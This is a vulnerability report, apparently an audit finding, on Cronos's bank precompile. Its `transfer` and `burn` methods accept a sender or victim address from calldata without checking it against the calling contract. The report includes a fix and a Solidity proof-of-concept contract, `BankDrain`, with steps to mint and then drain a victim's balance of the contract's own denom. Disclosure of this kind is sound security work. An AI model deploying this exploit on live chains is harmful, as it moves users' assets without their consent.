### Title
Unchecked `sender` Argument in Bank Precompile `transfer` Allows Unauthorized Asset Drain - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `transfer` method of the bank precompile accepts a `sender` address from calldata without verifying that `contract.Caller() == sender`. Any unprivileged EVM contract can therefore call `bank.transfer(victimAddress, attackerAddress, amount)` and move `evm/<attacker_contract>` denomination tokens out of the victim's account without the victim's consent.

### Finding Description
In `BankContract.Run`, the `TransferMethodName` branch unpacks `sender` directly from ABI-encoded calldata:

```go
sender := args[0].(common.Address)   // line 175 – taken from calldata, never validated
recipient := args[1].(common.Address)
...
denom := EVMDenom(contract.Caller())  // line 186 – evm/<calling_contract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // line 192
```

The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module accounts. There is no check that `contract.Caller() == sender`, so the calling contract can supply any address as `from`.

The `burn` branch has the same structural flaw: `recipient` (the address whose tokens are burned) is taken from calldata at line 121 without verifying it equals `contract.Caller()`. [1](#0-0) 

### Impact Explanation
`evm/<contract_address>` tokens are native Cosmos bank module assets managed exclusively through the bank precompile. An attacker who controls a contract at `0xMalicious` can:

1. Call `bank.mint(victimAddress, amount)` — unrestricted; any contract can mint its own denom to any address.
2. Call `bank.transfer(victimAddress, attackerAddress, amount)` — drains the victim's `evm/0xMalicious` balance without consent.

This constitutes an **unauthorized transfer of precompile-controlled assets**, matching the Critical impact tier. The same contract can also call `bank.burn(victimAddress, amount)` to destroy the victim's holdings. [2](#0-1) 

### Likelihood Explanation
The bank precompile is deployed at the fixed address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract with no access control at the precompile level. The attacker needs only to deploy a contract and submit two transactions. No privileged keys, governance, or validator access is required. [3](#0-2) 

### Recommendation
Add a caller-equality check at the top of the `TransferMethodName` branch (and analogously for `BurnMethodName`):

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

This mirrors the pattern already used in the ICA precompile, where `owner` is always derived from `contract.Caller()` rather than from calldata. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankDrain {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attacker mints evm/<this> tokens to victim (no restriction)
    function seed(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: attacker drains victim's evm/<this> balance without consent
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // sender == victim, but contract.Caller() == address(this) — no check blocks this
    }
}
```

1. Deploy `BankDrain` at `0xMalicious`.
2. Call `seed(victim, 1000)` — victim now holds `1000 evm/0xMalicious` in the Cosmos bank.
3. Call `drain(victim, attacker, 1000)` — the precompile executes `SendCoins(victim → attacker, evm/0xMalicious, 1000)` with no authorization from victim.

The `sender` argument flows directly into `bankKeeper.SendCoins` at line 192 without any equality check against `contract.Caller()` at line 186. [5](#0-4)
